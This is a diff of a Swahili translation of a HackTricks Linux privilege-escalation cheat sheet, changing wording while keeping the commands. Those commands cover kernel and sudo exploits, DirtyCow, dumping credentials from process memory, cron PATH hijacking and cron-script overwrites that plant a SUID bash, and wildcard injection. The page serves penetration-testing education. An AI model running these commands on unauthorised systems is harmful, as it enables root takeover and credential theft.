@@ -1,68 +1,68 @@
-# Kupanda Kwa Hadhi kwa Linux
+# Linux Privilege Escalation
 
 {% hint style="success" %}
-Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Taarifa za Mfumo
+## System Information
 
-### Taarifa za OS
+### OS info
 
-Anza kupata ufahamu wa OS inayoendesha
+Tuanzishe kwa kupata maarifa kuhusu OS inayotumika
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null # old, not by default on many systems
 cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
-### Njia
+### Path
 
-Ikiwa **una ruhusa ya kuandika kwenye folda yoyote ndani ya kipengee cha `PATH`** unaweza kuiba baadhi ya maktaba au programu za kutekeleza:
+Ikiwa una **idhini za kuandika kwenye folda yoyote ndani ya mabadiliko ya `PATH`** unaweza kuwa na uwezo wa kuiba baadhi ya maktaba au binaries:
 ```bash
 echo $PATH
 ```
-### Taarifa za Mazingira
+### Env info
 
-Je, kuna taarifa za kuvutia, nywila au funguo za API katika mazingira ya mazingira?
+Habari za kuvutia, nywila au funguo za API katika mabadiliko ya mazingira?
 ```bash
 (env || set) 2>/dev/null
 ```
-### Mbinu za Kudukua Kernel
+### Kernel exploits
 
-Angalia toleo la kernel na kama kuna mbinu ya kudukua inayoweza kutumika kuinua mamlaka.
+Angalia toleo la kernel na ikiwa kuna exploit ambayo inaweza kutumika kuongeza mamlaka
 ```bash
 cat /proc/version
 uname -a
 searchsploit "Linux Kernel"
 ```
-Unaweza kupata orodha nzuri ya kernel zenye mapungufu na baadhi ya **mashambulizi yaliyoundwa tayari** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
-Mitandao mingine ambapo unaweza kupata baadhi ya **mashambulizi yaliyoundwa tayari**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
+Unaweza kupata orodha nzuri ya kernel zenye udhaifu na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
+Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
-Kuchambua toleo zote za kernel zenye mapungufu kutoka kwenye wavuti hiyo unaweza kufanya:
+Ili kutoa toleo zote za kernel zenye udhaifu kutoka kwenye wavuti hiyo unaweza kufanya:
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
-Vyombo vinavyoweza kusaidia kutafuta mianya ya kernel ni:
+Tools that could help to search for kernel exploits are:
 
 [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
 [linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
-[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (itekelezwe NDANI ya mhanga, huchunguza mianya kwa kernel 2.x tu)
+[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)
 
-Daima **tafuta toleo la kernel kwenye Google**, labda toleo lako la kernel limeandikwa kwenye baadhi ya mianya ya kernel na kisha utahakikisha kuwa mianya hiyo ni halali.
+Daima **tafuta toleo la kernel kwenye Google**, labda toleo lako la kernel limeandikwa katika exploit fulani ya kernel na kisha utakuwa na uhakika kwamba exploit hii ni halali.
 
 ### CVE-2016-5195 (DirtyCow)
 
-Ukarabati wa Mamlaka kwenye Linux - Kernel ya Linux <= 3.19.0-73.8
+Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
 ```bash
 # make dirtycow stable
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
@@ -70,36 +70,36 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
 ```
-### Sudo toleo
+### Sudo version
 
-Kulingana na matoleo hatarishi ya sudo yanayoonekana katika:
+Kulingana na toleo la sudo lililo hatarini ambalo linaonekana katika:
 ```bash
 searchsploit sudo
 ```
-Unaweza kuangalia kama toleo la sudo lina kasoro kwa kutumia grep hii.
+Unaweza kuangalia kama toleo la sudo lina udhaifu kwa kutumia hii grep.
 ```bash
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
 #### sudo < v1.28
 
-Kutoka kwa @sickrov
+Kutoka @sickrov
 ```
 sudo -u#-1 /bin/bash
 ```
-### Uthibitisho wa saini ya Dmesg umeshindwa
+### Dmesg saini ya uthibitisho imefeli
 
-Angalia **sanduku la smasher2 la HTB** kwa **mfano** wa jinsi hii udhaifu unaweza kutumiwa
+Angalia **smasher2 box ya HTB** kwa **mfano** wa jinsi hii vuln inaweza kutumika.
 ```bash
 dmesg 2>/dev/null | grep "signature"
 ```
-### Uchunguzi zaidi wa mfumo
+### Zaidi ya uainishaji wa mfumo
 ```bash
 date 2>/dev/null #Date
 (df -h || lsblk) #System stats
 lscpu #CPU info
 lpstat -a 2>/dev/null #Printers info
 ```
-## Pambanua ulinzi uwezekanao
+## Orodhesha ulinzi unaowezekana
 
 ### AppArmor
 ```bash
@@ -114,8 +114,6 @@ echo "Not found AppArmor"
 fi
 ```
 ### Grsecurity
-
-### Grsecurity
 ```bash
 ((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
 ```
@@ -124,100 +122,94 @@ fi
 (which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
 ```
 ### Execshield
-
-### Execshield
 ```bash
 (grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
 ```
-### SElinux
-
 ### SElinux
 ```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
 ```
 ### ASLR
-
-ASLR (Address Space Layout Randomization) ni mbinu inayotumiwa katika ulinzi wa usalama wa mfumo wa uendeshaji kwa kubadilisha mahali ambapo sehemu muhimu za kumbukumbu zinawekwa.
 ```bash
 cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 #If 0, not enabled
 ```
-## Kuvunja Docker
+## Docker Breakout
 
-Ikiwa uko ndani ya kontena ya docker unaweza kujaribu kutoroka kutoka humo:
+Ikiwa uko ndani ya kontena la docker unaweza kujaribu kutoroka kutoka kwake:
 
 {% content-ref url="docker-security/" %}
 [docker-security](docker-security/)
 {% endcontent-ref %}
 
-## Madereva
+## Drives
 
-Angalia **nini kimeunganishwa na kimeunganishwa**, wapi na kwa nini. Ikiwa kitu chochote hakijaunganishwa unaweza kujaribu kuunganisha na kuangalia taarifa za kibinafsi.
+Angalia **kitu gani kimewekwa na kisichoweza kuwekwa**, wapi na kwa nini. Ikiwa chochote hakijawa kimewekwa unaweza kujaribu kukiweka na kuangalia taarifa za kibinafsi
 ```bash
 ls /dev 2>/dev/null | grep -i "sd"
 cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
 #Check if credentials in fstab
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
 ```
-## Programu za Kufaa
+## Programu muhimu
 
-Panga programu muhimu
+Taja binaries muhimu
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
-Pia, angalia ikiwa **kuna compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia baadhi ya kernel exploit kwani inapendekezwa kuikusanya kwenye mashine ambayo utaitumia (au kwenye moja kama hiyo)
+Pia, angalia kama **compiler yeyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia exploit ya kernel kwani inashauriwa kuikamilisha kwenye mashine unayotaka kuitumia (au kwenye moja inayofanana)
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
-### Programu Zenye Udhaifu Zilizosakinishwa
+### Programu Zenye Uthibitisho Zilizowekwa
 
-Angalia **toleo la pakiti na huduma zilizosakinishwa**. Labda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumika kwa kufanya uwezekano wa kupata mamlaka zaidi...\
-Inashauriwa kuangalia kwa mkono toleo la programu iliyosakinishwa ambayo inaonekana kuwa ya shaka zaidi.
+Angalia **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumika kwa ajili ya kupandisha mamlaka...\
+Inapendekezwa kuangalia kwa mikono toleo la programu zinazoshuku zaidi zilizowekwa.
 ```bash
 dpkg -l #Debian
 rpm -qa #Centos
 ```
-Ikiwa una ufikiaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kuchunguza programu iliyopitwa na wakati na inayoweza kudhuriwa iliyosakinishwa kwenye mashine.
+Ikiwa una ufikiaji wa SSH kwa mashine hiyo unaweza pia kutumia **openVAS** kuangalia programu zilizopitwa na wakati na zenye udhaifu zilizowekwa ndani ya mashine.
 
 {% hint style="info" %}
-_Taarifa kwamba amri hizi zitaonyesha habari nyingi ambazo kwa kiasi kikubwa hazitakuwa na maana, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au sawa nayo itakayochunguza ikiwa toleo lolote la programu iliyosakinishwa linaweza kudhuriwa na mashambulizi yanayojulikana_
+_Kumbuka kwamba amri hizi zitaonyesha habari nyingi ambazo kwa kiasi kikubwa zitakuwa hazina maana, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au sawa na hiyo ambayo itakagua ikiwa toleo lolote la programu lililowekwa lina udhaifu kwa mashambulizi yanayojulikana_
 {% endhint %}
 
 ## Mchakato
 
-Angalia **mchakato gani** unatekelezwa na uchunguze ikiwa mchakato wowote una **mamlaka zaidi kuliko inavyopaswa** (labda tomcat inatekelezwa na root?)
+Angalia **michakato ipi** inatekelezwa na uangalie ikiwa mchakato wowote una **privilege zaidi kuliko inavyopaswa** (labda tomcat inatekelezwa na root?)
 ```bash
 ps aux
 ps -ef
 top -n 1
 ```
-Hakikisha kila wakati kuna [**debuggers za electron/cef/chromium** zinazoendesha, unaweza kuzitumia kwa kujiongezea mamlaka](electron-cef-chromium-debugger-abuse.md). **Linpeas** huchunguza hizo kwa kuangalia parameter `--inspect` ndani ya mstari wa amri ya mchakato.\
-Pia **angalia mamlaka yako kwenye binaries za michakato**, labda unaweza kubadilisha faili ya mtu mwingine.
+Daima angalia kwa [**electron/cef/chromium debuggers** zinazotembea, unaweza kuzitumia kuboresha mamlaka](electron-cef-chromium-debugger-abuse.md). **Linpeas** inatambua hizo kwa kuangalia parameter `--inspect` ndani ya mistari ya amri ya mchakato.\
+Pia **angalia mamlaka yako juu ya binaries za michakato**, labda unaweza kuandika upya mtu.
 
-### Ufuatiliaji wa Mchakato
+### Ufuatiliaji wa mchakato
 
-Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa na manufaa sana kwa kutambua michakato dhaifu inayoendeshwa mara kwa mara au wakati seti fulani ya mahitaji inakidhiwa.
+Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kutambua michakato dhaifu inayotekelezwa mara kwa mara au wakati seti ya mahitaji inakamilika.
 
-### Kumbukumbu ya Mchakato
+### Kumbukumbu ya mchakato
 
-Baadhi ya huduma za seva huficha **vyeti kwa maandishi wazi ndani ya kumbukumbu**.\
-Kawaida utahitaji **mamlaka ya mzizi** kusoma kumbukumbu ya michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kawaida ni muhimu zaidi wakati tayari umepata mamlaka ya mzizi na unataka kugundua vyeti zaidi.\
+Huduma zingine za seva huhifadhi **vithibitisho kwa maandiko wazi ndani ya kumbukumbu**.\
+Kwa kawaida utahitaji **mamlaka ya root** kusoma kumbukumbu ya michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kawaida ni muhimu zaidi unapokuwa tayari root na unataka kugundua vithibitisho zaidi.\
 Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.
 
 {% hint style="warning" %}
-Tambua kwamba siku hizi zaidi ya mashine **haziruhusu ptrace kwa chaguo-msingi** ambayo inamaanisha huwezi kudump michakato mingine inayomilikiwa na mtumiaji wako asiye na mamlaka.
+Kumbuka kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa default** ambayo inamaanisha huwezi kutupa michakato mingine inayomilikiwa na mtumiaji asiye na mamlaka.
 
-Faili _**/proc/sys/kernel/yama/ptrace\_scope**_ inadhibiti upatikanaji wa ptrace:
+Faili _**/proc/sys/kernel/yama/ptrace\_scope**_ inasimamia upatikanaji wa ptrace:
 
-* **kernel.yama.ptrace\_scope = 0**: michakato yote inaweza kufuatiliwa, mradi wawe na uid sawa. Hii ndiyo njia ya kawaida ya ptracing ilivyofanya kazi.
-* **kernel.yama.ptrace\_scope = 1**: mchakato wa mzazi pekee unaweza kufuatiliwa.
-* **kernel.yama.ptrace\_scope = 2**: Msimamizi pekee anaweza kutumia ptrace, kwani inahitaji uwezo wa CAP\_SYS\_PTRACE.
-* **kernel.yama.ptrace\_scope = 3**: Hakuna michakato inayoweza kufuatiliwa na ptrace. Mara baada ya kuweka, ni lazima kuzima upya ili kuwezesha tena ptracing.
+* **kernel.yama.ptrace\_scope = 0**: michakato yote inaweza kufuatiliwa, mradi tu zina uid sawa. Hii ndiyo njia ya kawaida jinsi ptracing ilivyofanya kazi.
+* **kernel.yama.ptrace\_scope = 1**: mchakato wa mzazi tu unaweza kufuatiliwa.
+* **kernel.yama.ptrace\_scope = 2**: Ni admin tu anayeweza kutumia ptrace, kwani inahitaji uwezo wa CAP\_SYS\_PTRACE.
+* **kernel.yama.ptrace\_scope = 3**: Hakuna michakato inayoweza kufuatiliwa kwa ptrace. Mara ikipangwa, upya ni muhimu ili kuwezesha ptracing tena.
 {% endhint %}
 
 #### GDB
 
-Ukiwa na ufikiaji wa kumbukumbu ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani ya vyeti vyake.
+Ikiwa una upatikanaji wa kumbukumbu ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani ya vithibitisho vyake.
 ```bash
 gdb -p <FTP_PROCESS_PID>
 (gdb) info proc mappings
@@ -226,7 +218,7 @@ gdb -p <FTP_PROCESS_PID>
 (gdb) q
 strings /tmp/mem_ftp #User and password
 ```
-#### Skripti ya GDB
+#### GDB Script
 
 {% code title="dump-memory.sh" %}
 ```bash
@@ -243,7 +235,7 @@ done
 
 #### /proc/$pid/maps & /proc/$pid/mem
 
-Kwa kitambulisho cha mchakato kilichopewa, **ramani inaonyesha jinsi kumbukumbu inavyoainishwa ndani ya nafasi ya anwani ya kielelezo cha mchakato huo**; pia inaonyesha **ruhusa za kila eneo lililoainishwa**. Faili bandia ya **mem** inaonyesha **kumbukumbu za mchakato yenyewe**. Kutoka kwa faili za **ramani** tunajua ni **eneo gani la kumbukumbu linaloweza kusomwa** na mapinduzi yao. Tunatumia habari hii kutafuta kwenye faili ya mem na kudondosha **eneo zote zinazoweza kusomwa** kwenye faili.
+Kwa kitambulisho cha mchakato kilichotolewa, **ramani zinaonyesha jinsi kumbukumbu inavyopangwa ndani ya nafasi ya anwani ya mchakato huo**; pia inaonyesha **idhini za kila eneo lililopangwa**. Faili ya **mem** ya pseudo **inaonyesha kumbukumbu ya mchakato yenyewe**. Kutoka kwenye faili la **ramani** tunajua ni zipi **sehemu za kumbukumbu zinazoweza kusomwa** na ofset zao. Tunatumia taarifa hii **kutafuta ndani ya faili la mem na kutupa maeneo yote yanayoweza kusomwa** kwenye faili.
 ```bash
 procdump()
 (
@@ -258,13 +250,14 @@ rm $1*.bin
 ```
 #### /dev/mem
 
-`/dev/mem` hutoa ufikiaji kwa **kumbukumbu** ya kimwili ya mfumo, siyo kumbukumbu ya kawaida. Nafasi ya anwani za kumbukumbu ya kawaida ya kernel inaweza kupatikana kwa kutumia /dev/kmem. Kwa kawaida, `/dev/mem` inaweza kusomwa tu na mtumiaji wa **root** na kikundi cha **kmem**.
+`/dev/mem` inatoa ufikiaji wa **kimwili** wa kumbukumbu ya mfumo, si kumbukumbu ya virtual. Nafasi ya anwani ya virtual ya kernel inaweza kufikiwa kwa kutumia /dev/kmem.\
+Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
 ```
 strings /dev/mem -n10 | grep -i PASS
 ```
 ### ProcDump kwa linux
 
-ProcDump ni ubunifu wa Linux wa zana ya kawaida ya ProcDump kutoka kwa seti ya zana za Sysinternals kwa Windows. Pata katika [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
+ProcDump ni toleo jipya la Linux la chombo cha jadi cha ProcDump kutoka kwa seti ya zana za Sysinternals kwa Windows. Pata hapa [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
 ```
 procdump -p 1714
 
@@ -291,42 +284,42 @@ Press Ctrl-C to end monitoring without terminating the process.
 [20:20:58 - INFO]: Timed:
 [20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
 ```
-### Vifaa
+### Tools
 
-Kudumpisha kumbukumbu ya mchakato unaweza kutumia:
+Ili kudump kumbukumbu ya mchakato unaweza kutumia:
 
 * [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
-* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mahitaji ya root kwa mkono na kudump mchakato unaomilikiwa na wewe
-* Skripti A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)
+* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mahitaji ya root kwa mikono na kudump mchakato unaomilikiwa na wewe
+* Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)
 
-### Sifa kutoka Kumbukumbu ya Mchakato
+### Credentials from Process Memory
 
-#### Mfano wa Kibinafsi
+#### Manual example
 
-Ukipata kwamba mchakato wa kuthibitisha unafanya kazi:
+Ikiwa unapata kwamba mchakato wa uthibitishaji unafanya kazi:
 ```bash
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
 ```
-Unaweza kudondosha mchakato (angalia sehemu zilizotangulia kupata njia tofauti za kudondosha kumbukumbu ya mchakato) na kutafuta sifa ndani ya kumbukumbu:
+Unaweza kutupa mchakato (angalia sehemu za awali ili kupata njia tofauti za kutupa kumbukumbu ya mchakato) na kutafuta akreditivu ndani ya kumbukumbu:
 ```bash
 ./dump-memory.sh 2027
 strings *.dump | grep -i password
 ```
 #### mimipenguin
 
-Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **itakuiba vibali vya maandishi wazi kutoka kumbukumbu** na kutoka kwa **faili fulani maarufu**. Inahitaji mamlaka ya mzizi kufanya kazi vizuri.
+Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitachukua **akili za maandiko wazi kutoka kwenye kumbukumbu** na kutoka kwa **faili maarufu**. Kinahitaji ruhusa za root ili kufanya kazi vizuri.
 
-| Kipengele                                           | Jina la Mchakato     |
+| Kipengele                                         | Jina la Mchakato     |
 | ------------------------------------------------- | -------------------- |
-| Nywila ya GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
+| Nywila ya GDM (Kali Desktop, Debian Desktop)      | gdm-password         |
 | Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
 | LightDM (Ubuntu Desktop)                          | lightdm              |
-| VSFTPd (Mawasiliano ya FTP ya Moja kwa Moja)                   | vsftpd               |
-| Apache2 (Vikao vya Msingi vya HTTP vya Moja kwa Moja)         | apache2              |
-| OpenSSH (Vikao vya SSH vya Moja kwa Moja - Matumizi ya Sudo)        | sshd:                |
+| VSFTPd (Mawasiliano ya FTP ya Kazi)              | vsftpd               |
+| Apache2 (Mikutano ya HTTP Basic Auth ya Kazi)    | apache2              |
+| OpenSSH (Mikutano ya SSH ya Kazi - Matumizi ya Sudo) | sshd:                |
 
-#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
+#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
 ```bash
 # un truffleproc.sh against your current Bash shell (e.g. $$)
 ./truffleproc.sh $$
@@ -340,158 +333,158 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 # finding secrets
 # results in /tmp/tmp.o6HV0Pl3fe/results.txt
 ```
-## Kazi za Kipangilio/Cron
+## Scheduled/Cron jobs
 
-Angalia kama kuna kazi ya kipangilio inayoweza kuwa na mapungufu. Labda unaweza kutumia script inayotekelezwa na root (vuln ya wildcard? unaweza kuhariri faili ambazo root anatumia? tumia viungo vya ishara? tengeneza faili maalum kwenye saraka ambayo root anatumia?).
+Angalia kama kazi yoyote iliyopangwa ina udhaifu. Labda unaweza kunufaika na script inayotekelezwa na root (udhaifu wa wildcard? inaweza kubadilisha faili ambazo root inatumia? tumia symlinks? tengeneza faili maalum katika saraka ambayo root inatumia?).
 ```bash
 crontab -l
 ls -al /etc/cron* /etc/at*
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 ```
-### Njia ya Cron
+### Cron path
 
 Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
 
-(_Tafadhali kumbuka jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)
+(_Kumbuka jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)
 
 Ikiwa ndani ya crontab hii mtumiaji wa root anajaribu kutekeleza amri au script bila kuweka njia. Kwa mfano: _\* \* \* \* root overwrite.sh_\
-Kisha, unaweza kupata shell ya root kwa kutumia:
+Basi, unaweza kupata root shell kwa kutumia:
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 #Wait cron job to be executed
 /tmp/bash -p #The effective uid and gid to be set to the real uid and gid
 ```
-### Cron kutumia script na wildcard (Wildcard Injection)
+### Cron kutumia script yenye wildcard (Wildcard Injection)
 
-Ikiwa script inatekelezwa na root ina "**\***" ndani ya amri, unaweza kutumia hii kufanya mambo yasiyotarajiwa (kama privesc). Mfano:
+Ikiwa script inayotekelezwa na root ina “**\***” ndani ya amri, unaweza kuitumia hii kufanya mambo yasiyotarajiwa (kama privesc). Mfano:
 ```bash
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
-**Ikiwa kichwa cha panya kinafuatiwa na njia kama** _**/baadhi/ya/njia/\***_ **, sio dhaifu (hata** _**./\***_ **sio).**
+**Ikiwa wildcard imeandamana na njia kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **haina hatari).**
 
-Soma ukurasa ufuatao kwa mbinu zaidi za kutumia kichwa cha panya:
+Soma ukurasa ufuatao kwa mbinu zaidi za unyakuzi wa wildcard:
 
 {% content-ref url="wildcards-spare-tricks.md" %}
 [wildcards-spare-tricks.md](wildcards-spare-tricks.md)
 {% endcontent-ref %}
 
-### Kuandika upya skripti ya Cron na kiungo cha alama
+### Kuandika tena skripti ya Cron na symlink
 
-Ikiwa **unaweza kuhariri skripti ya cron** inayotekelezwa na root, unaweza kupata kabisa kuingia kwa urahisi:
+Ikiwa **unaweza kubadilisha skripti ya cron** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-Ikiwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, labda itakuwa na manufaa kufuta saraka hiyo na **kuunda kiungo ishara cha saraka nyingine** kuhudumia script inayodhibitiwa na wewe
+Ikiwa skripti inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, huenda ikawa na manufaa kufuta folda hiyo na **kuunda folda ya symlink kwa nyingine** inayohudumia skripti inayodhibitiwa na wewe
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
-### Kazi za cron mara kwa mara
+### Kazi za cron za mara kwa mara
 
-Unaweza kufuatilia michakato kutafuta michakato inayotekelezwa kila baada ya dakika 1, 2 au 5. Labda unaweza kunufaika nayo na kupandisha mamlaka.
+Unaweza kufuatilia michakato ili kutafuta michakato inayotekelezwa kila dakika 1, 2 au 5. Huenda unaweza kunufaika na hilo na kupandisha mamlaka.
 
-Kwa mfano, kufuatilia kila **0.1s kwa dakika 1**, **panga kwa amri zilizotekelezwa kidogo** na futa amri ambazo zimetekelezwa zaidi, unaweza kufanya:
+Kwa mfano, ili **kufuatilia kila 0.1s kwa dakika 1**, **panga kwa amri zilizotekelezwa kidogo** na uondoe amri ambazo zimekuwa zikitekelezwa zaidi, unaweza kufanya:
 ```bash
 for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
 ```
-**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itachunguza na kuorodhesha kila mchakato unaoanza).
+**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itasimamia na kuorodhesha kila mchakato unaoanza).
 
-### Majukumu ya cron yasiyoonekana
+### Kazi za cron zisizoonekana
 
-Inawezekana kuunda jukumu la cron **kwa kuweka kurudi kiotomatiki baada ya maoni** (bila herufi ya mstari mpya), na jukumu la cron litafanya kazi. Mfano (zingatia herufi ya kurudi kiotomatiki):
